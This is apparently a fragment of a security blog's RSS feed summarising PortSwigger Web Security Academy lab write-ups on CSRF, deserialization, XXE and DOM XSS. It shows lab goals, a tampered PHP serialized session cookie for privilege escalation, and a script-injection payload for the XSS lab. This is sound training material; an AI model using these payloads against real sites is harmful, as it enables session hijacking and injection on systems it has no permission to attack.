+ &lt;a class="anchor" href="#lab-csrf-vulnerability-with-no-defenses">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>Description: This lab&amp;rsquo;s email change functionality is vulnerable to CSRF.&lt;/li>
+&lt;li>Goal: To solve the lab, craft some HTML that uses a CSRF attack to change the viewer&amp;rsquo;s email address and upload it to your exploit server.
+You can log in to your own account using the following credentials: &lt;code>wiener:peter&lt;/code>&lt;/li>
+&lt;li>Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.&lt;/li>
+&lt;/ul>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler
+&lt;a href="https://medium.com/@Tommmmm/csrf-%e6%94%bb%e6%93%8a%e5%8e%9f%e7%90%86-d0f2a51810ca">CSRF 攻擊原理&lt;/a>
+&lt;a href="https://ithelp.ithome.com.tw/articles/10251769">[Day25]- 新手的Web系列CSRF&lt;/a>&lt;/p></description></item><item><title>Deserialization - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/</guid><description>&lt;h1 id="deserialization---apprentice">
+ Deserialization - APPRENTICE
+ &lt;a class="anchor" href="#deserialization---apprentice">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;h2 id="lab-modifying-serialized-objects">
+ Lab: Modifying serialized objects
+ &lt;a class="anchor" href="#lab-modifying-serialized-objects">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>Description: This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result.&lt;/li>
+&lt;li>Goal: To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos&amp;rsquo;s account.
+You can log in to your own account using the following credentials: wiener:peter&lt;/li>
+&lt;/ul>
+&lt;h3 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h3>
+&lt;ol>
+&lt;li>Login First &amp;amp; Recon the package
+According to the description, we know that the user verification has insecure deserialization. Therefore, we can recon the package first as below.
+&lt;img src="https://i.imgur.com/zuKHXRF.png" alt="" />
+You can notice the session is a base64-encoded string and we use the built-in feature in burp suite to decode it.
+Session: &lt;code>Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d&lt;/code>
+Decoded String: &lt;code>O:4:&amp;quot;User&amp;quot;:2:{s:8:&amp;quot;username&amp;quot;;s:6:&amp;quot;wiener&amp;quot;;s:5:&amp;quot;admin&amp;quot;;b:0;}&lt;/code>&lt;/li>
+&lt;li>How about Modify the session directly
+&lt;img src="https://i.imgur.com/Ent5yuu.png" alt="" />&lt;/li>
+&lt;/ol>
+&lt;h3 id="exp---change-directly">
+ Exp - Change Directly
+ &lt;a class="anchor" href="#exp---change-directly">#&lt;/a>
+&lt;/h3>
+&lt;ol>
+&lt;li>We can use the built-in feature to change our session to &lt;code>admin=1&lt;/code> directly to then send it forward.
+:::info
+Each package may contain the session that should be modified. So, pay attention to before sending it forward
+:::&lt;/li>
+&lt;li>Delete Carlos
+&lt;img src="https://i.imgur.com/9KGxgZD.png" alt="" />&lt;/li>
+&lt;/ol>
+&lt;p>:::spoiler Success Screenshot
+&lt;img src="https://i.imgur.com/eQEfiaw.png" alt="" />
+:::&lt;/p></description></item><item><title>Lab: Arbitrary object injection in PHP</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/</guid><description>&lt;h1 id="lab-arbitrary-object-injection-in-php">
+ Lab: Arbitrary object injection in PHP
+ &lt;a class="anchor" href="#lab-arbitrary-object-injection-in-php">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result.&lt;/li>
+&lt;li>Goal: To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos&amp;rsquo;s home directory. You will need to obtain source code access to solve this lab.
+You can log in to your own account using the following credentials: wiener:peter&lt;/li>
+&lt;li>Hint: You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file.&lt;/li>
+&lt;/ul>
+&lt;h2 id="constructor--deconstructor">
+ Constructor &amp;amp; Deconstructor
+ &lt;a class="anchor" href="#constructor--deconstructor">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://tw511.com/a/01/26451.html">Python建構函式與解構函式（&lt;strong>init&lt;/strong>()和__del__()）&lt;/a>
+其實概念就是Python的&lt;code>__init()__&lt;/code> function，在instanciate一個class的時候扮演初始化的功能而已
+而deconstructor就是Python中的&lt;code>__del__()&lt;/code> function用來回收不需要的class，以達到降低記憶體的使用量&lt;/p></description></item><item><title>Lab: Blind XXE with out-of-band interaction</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/</guid><description>&lt;h1 id="lab-blind-xxe-with-out-of-band-interaction">
+ Lab: Blind XXE with out-of-band interaction
+ &lt;a class="anchor" href="#lab-blind-xxe-with-out-of-band-interaction">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that parses XML input but does not display the result.
+You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.&lt;/li>
+&lt;li>Goal: To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.&lt;/li>
+&lt;li>Hint:&lt;/li>
+&lt;/ul>
+&lt;h2 id="background">
+ &lt;a href="https://portswigger.net/web-security/xxe/blind">Background&lt;/a>
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;blockquote>
+&lt;p>有兩種廣泛的方法可以找到和利用Blind XXE 漏洞：&lt;/p></description></item><item><title>Lab: Blind XXE with out-of-band interaction via XML parameter entities</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/</guid><description>&lt;h1 id="lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities">
+ Lab: Blind XXE with out-of-band interaction via XML parameter entities
+ &lt;a class="anchor" href="#lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.&lt;/li>
+&lt;li>Goal: To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.&lt;/li>
+&lt;li>Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator&amp;rsquo;s default public server.&lt;/li>
+&lt;/ul>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>這一題會用到Parameter Entity，也就是當server端擋掉外部的entity輸入時，可以直接在&lt;code>DOCTYPE&lt;/code>中直接Reference，也就是利用&lt;code>%&lt;/code>這個字元達到這個效果&lt;/p></description></item><item><title>Lab: CSRF where token is not tied to user session</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/</guid><description>&lt;h1 id="lab-csrf-where-token-is-not-tied-to-user-session">
+ Lab: CSRF where token is not tied to user session
+ &lt;a class="anchor" href="#lab-csrf-where-token-is-not-tied-to-user-session">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab&amp;rsquo;s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren&amp;rsquo;t integrated into the site&amp;rsquo;s session handling system.&lt;/li>
+&lt;li>Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&amp;rsquo;s email address.
+You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
+&lt;code>wiener:peter&lt;/code>
+&lt;code>carlos:montoya&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>CSRF token should tied to user session otherwise, it&amp;rsquo;ll exploited by attacker.&lt;/p></description></item><item><title>Lab: CSRF where token is tied to non-session cookie</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/</guid><description>&lt;h1 id="lab-csrf-where-token-is-tied-to-non-session-cookie">
+ Lab: CSRF where token is tied to non-session cookie
+ &lt;a class="anchor" href="#lab-csrf-where-token-is-tied-to-non-session-cookie">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>
+&lt;p>Description: This lab&amp;rsquo;s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren&amp;rsquo;t fully integrated into the site&amp;rsquo;s session handling system.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&amp;rsquo;s email address.
+You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
+&lt;code>wiener:peter&lt;/code>
+&lt;code>carlos:montoya&lt;/code>&lt;/p></description></item><item><title>Lab: CSRF where token validation depends on request method</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/</guid><description>&lt;h1 id="lab-csrf-where-token-validation-depends-on-request-method">
+ Lab: CSRF where token validation depends on request method
+ &lt;a class="anchor" href="#lab-csrf-where-token-validation-depends-on-request-method">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab&amp;rsquo;s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.&lt;/li>
+&lt;li>Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&amp;rsquo;s email address.
+You can log in to your own account using the following credentials: &lt;code>wiener:peter&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Login and update email to trace the package
+Like the previous lab, we first login to the website and update the email. At the same time, we can trace update email package shown below:
+&lt;img src="https://i.imgur.com/ju0fDUQ.png" alt="" />
+We can notice that the carried data including &lt;code>csrf_token&lt;/code>&lt;/p></description></item><item><title>Lab: CSRF where token validation depends on token being present</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/</guid><description>&lt;h1 id="lab-csrf-where-token-validation-depends-on-token-being-present">
+ Lab: CSRF where token validation depends on token being present
+ &lt;a class="anchor" href="#lab-csrf-where-token-validation-depends-on-token-being-present">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab&amp;rsquo;s email change functionality is vulnerable to CSRF.&lt;/li>
+&lt;li>Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&amp;rsquo;s email address.
+You can log in to your own account using the following credentials: &lt;code>wiener:peter&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Login and update email to trace the package
+It&amp;rsquo;s very similar with previous lab $\to$ it contained &lt;code>CSRF_token&lt;/code> as its carried data:
+&lt;img src="https://i.imgur.com/69FaW1R.png" alt="" />&lt;/p></description></item><item><title>Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/</guid><description>&lt;h1 id="lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element">
+ Lab: DOM XSS in &lt;code>document.write&lt;/code> sink using source &lt;code>location.search&lt;/code> inside a select element
+ &lt;a class="anchor" href="#lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript &lt;code>document.write&lt;/code> function, which writes data out to the page. The &lt;code>document.write&lt;/code> function is called with data from &lt;code>location.search&lt;/code> which you can control using the website URL. The data is enclosed within a select element.&lt;/li>
+&lt;li>Goal: To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the &lt;code>alert&lt;/code> function.&lt;/li>
+&lt;/ul>
+&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>Find the injection place
+I used string search to find &lt;code>location.search&lt;/code> in each sub-page source.
+Here is the interesting code:
+:::spoiler Source Code
+&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
+&amp;lt;script&amp;gt;
+ var stores = [&amp;#34;London&amp;#34;,&amp;#34;Paris&amp;#34;,&amp;#34;Milan&amp;#34;];
+ var store = (new URLSearchParams(window.location.search)).get(&amp;#39;storeId&amp;#39;);
+ document.write(&amp;#39;&amp;lt;select name=&amp;#34;storeId&amp;#34;&amp;gt;&amp;#39;);
+ if(store) {
+ document.write(&amp;#39;&amp;lt;option selected&amp;gt;&amp;#39;+store+&amp;#39;&amp;lt;/option&amp;gt;&amp;#39;);
+ }
+ for(var i=0;i&amp;lt;stores.length;i++) {
+ if(stores[i] === store) {
+ continue;
+ }
+ document.write(&amp;#39;&amp;lt;option&amp;gt;&amp;#39;+stores[i]+&amp;#39;&amp;lt;/option&amp;gt;&amp;#39;);
+ }
+ document.write(&amp;#39;&amp;lt;/select&amp;gt;&amp;#39;);
+&amp;lt;/script&amp;gt;
+...
+&lt;/code>&lt;/pre>:::&lt;/li>
+&lt;li>Try type something about &lt;code>storeID&lt;/code> as URL GET parameter
+Payload: &lt;code>/product?productId=1&amp;amp;storeId=abc&lt;/code>
+&lt;img src="https://i.imgur.com/KKbTF8f.png" alt="" />
+You can see that this is a perfect injection place&lt;/li>
+&lt;/ol>
+&lt;h2 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h2>
+&lt;p>Payload: &lt;code>/product?productId=1&amp;amp;storeId=&amp;lt;script&amp;gt;alert(123);&amp;lt;/script&amp;gt;&lt;/code>
+:::spoiler Success Screenshot
+&lt;img src="https://i.imgur.com/bjEoUzh.png" alt="" />
+:::&lt;/p></description></item><item><title>Lab: Exploiting `XInclude` to retrieve files</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/</guid><description>&lt;h1 id="lab-exploiting-xinclude-to-retrieve-files">
+ Lab: Exploiting &lt;code>XInclude&lt;/code> to retrieve files
+ &lt;a class="anchor" href="#lab-exploiting-xinclude-to-retrieve-files">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that embeds the user input inside a server-side XML document that is subsequently parsed.
+Because you don&amp;rsquo;t control the entire XML document you can&amp;rsquo;t define a DTD to launch a classic XXE attack.&lt;/li>
+&lt;li>Goal: To solve the lab, inject an &lt;code>XInclude&lt;/code> statement to retrieve the contents of the /etc/passwd file.&lt;/li>
+&lt;li>Hint: By default, &lt;code>XInclude&lt;/code> will try to parse the included document as XML. Since /etc/passwd isn&amp;rsquo;t valid XML, you will need to add an extra attribute to the &lt;code>XInclude&lt;/code> directive to change this behavior.&lt;/li>
+&lt;/ul>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;blockquote>
+&lt;p>XInclude is a part of the XML specification that allows an XML document to be built from sub documents You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server side XML document&lt;/p></description></item><item><title>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/</guid><description>&lt;h1 id="lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd">
+ Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+ &lt;a class="anchor" href="#lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that parses XML input but does not display the result.&lt;/li>
+&lt;li>Goal: To solve the lab, exfiltrate the contents of the /etc/hostname file.&lt;/li>
+&lt;li>Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator&amp;rsquo;s default public server.&lt;/li>
+&lt;/ul>
+&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Use the previous method
+:::spoiler Payload&lt;/p></description></item><item><title>Lab: Exploiting blind XXE to retrieve data via error messages</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/</guid><description>&lt;h1 id="lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages">
+ Lab: Exploiting blind XXE to retrieve data via error messages
+ &lt;a class="anchor" href="#lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that parses XML input but does not display the result.&lt;/li>
+&lt;li>Goal: To solve the lab, use an external DTD to trigger an error message that displays the contents of the &lt;code>/etc/passwd&lt;/code> file.
+The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.&lt;/li>
+&lt;/ul>
+&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;p>This is very similar to the previous lab(Exploiting blind XXE to exfiltrate data using a malicious external DTD)&lt;/p></description></item><item><title>Lab: Exploiting Java deserialization with Apache Commons</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/</guid><description>&lt;h1 id="lab-exploiting-java-deserialization-with-apache-commons">
+ Lab: Exploiting Java deserialization with Apache Commons
+ &lt;a class="anchor" href="#lab-exploiting-java-deserialization-with-apache-commons">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don&amp;rsquo;t have source code access, you can still exploit this lab using pre-built gadget chains.&lt;/li>
+&lt;li>Goal: To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos&amp;rsquo;s home directory.
+You can log in to your own account using the following credentials: wiener:peter&lt;/li>
+&lt;/ul>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://ccship.cn/2021/10/21/ysoserial%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">ysoserial使用方法&lt;/a>&lt;/p></description></item><item><title>Lab: Exploiting XXE via image file upload</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/</guid><description>&lt;h1 id="lab-exploiting-xxe-via-image-file-upload">
+ Lab: Exploiting XXE via image file upload
+ &lt;a class="anchor" href="#lab-exploiting-xxe-via-image-file-upload">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.&lt;/li>
+&lt;li>Goal: To solve the lab, upload an image that displays the contents of the &lt;code>/etc/hostname&lt;/code> file after processing. Then use the &amp;ldquo;Submit solution&amp;rdquo; button to submit the value of the server hostname.&lt;/li>
+&lt;/ul>
+&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;p>In this lab, we can upload an exploited file which contained malicious xml data. Then we can fetch some sensitive information.&lt;/p></description></item><item><title>Lab: Modifying serialized data types</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/</guid><description>&lt;h1 id="lab-modifying-serialized-data-types">
+ Lab: Modifying serialized data types
+ &lt;a class="anchor" href="#lab-modifying-serialized-data-types">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result&lt;/li>
+&lt;li>Goal: To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.
+You can log in to your own account using the following credentials: wiener:peter&lt;/li>
+&lt;/ul>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
